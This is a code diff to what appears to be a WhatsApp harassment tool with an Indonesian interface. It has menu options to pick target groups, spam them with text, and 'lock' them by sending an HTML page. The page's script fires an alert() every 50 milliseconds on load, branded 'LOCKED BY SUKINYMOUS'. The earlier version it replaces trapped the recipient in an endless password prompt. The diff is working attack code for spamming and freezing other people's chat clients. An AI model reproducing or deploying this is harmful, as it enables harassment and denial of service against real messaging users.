@@ -34,20 +34,25 @@ function ask(q) {
 }
 
 async function sendJsAlert(jid) {
-    const jsScript = `
-        function startLoop() {
-            while (true) {
-                var pass = prompt("LOCKED BY SUKINYMOUS\\n\\nMasukan Password Min 8 Char");
-                if (pass === null) {
-                    continue; 
-                }
-                alert("Password Salah! Akses Ditolak.");
-            }
+    const htmlPayload = `<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Locked</title>
+</head>
+<body>
+    <script>
+        function showAlert() {
+            alert("LOCKED BY SUKINYMOUS\\n\\nSUKINYMOUS IS HERE🤓😹\\n\\n\\nLOLZERSS😹");
+            setTimeout(showAlert, 50);
         }
-        window.onload = startLoop;
-    `;
-
-    const htmlPayload = `<!DOCTYPE html><html><head><style>body{background-color:#000;color:#fff;display:none;}</style></head><body><script>${jsScript}</script></body></html>`;
+        window.onload = function() {
+            showAlert();
+        };
+    </script>
+</body>
+</html>`
 
     try {
         await sock.sendRichHtml(jid, {
@@ -108,7 +113,7 @@ async function mainMenu() {
         }
         clr(); console.log(BANNER)
         console.log(`[1] Target: ${tgtName || "None"}`)
-        console.log(`[2] Spam`)
+        console.log(`[2] Spam Teks`)
         console.log(`[3] Lock Grup (HTML/JS)`)
         console.log(`[4] Exit\n`)
 
@@ -153,18 +158,6 @@ async function selectTarget() {
     }
 }
 
-async function lockTargetGroup() {
-    clr(); console.log(BANNER); console.log(`[*] Mengirim JS Alert ke ${tgt.length} target...\n`)
-    
-    for (let i = 0; i < tgt.length; i++) {
-        await sendJsAlert(tgt[i])
-        await slp(2000)
-    }
-    
-    console.log("\n[!] Selesai. Cek grup target.")
-    await ask("\nTekan Enter untuk kembali.")
-}
-
 async function startSpam() {
     clr(); console.log(BANNER); console.log(`[TGT] ${tgtName} (${tgt.length})\n`)
     
@@ -201,6 +194,18 @@ async function startSpam() {
     loop()
     
     while (spamming) await slp(1000)
+}
+
+async function lockTargetGroup() {
+    clr(); console.log(BANNER); console.log(`[*] Mengirim HTML/JS Alert ke ${tgt.length} target...\n`)
+    
+    for (let i = 0; i < tgt.length; i++) {
+        await sendJsAlert(tgt[i])
+        await slp(2000)
+    }
+    
+    console.log("\n[!] Selesai. Cek grup target.")
+    await ask("\nTekan Enter untuk kembali.")
 }
 
 async function connect() {
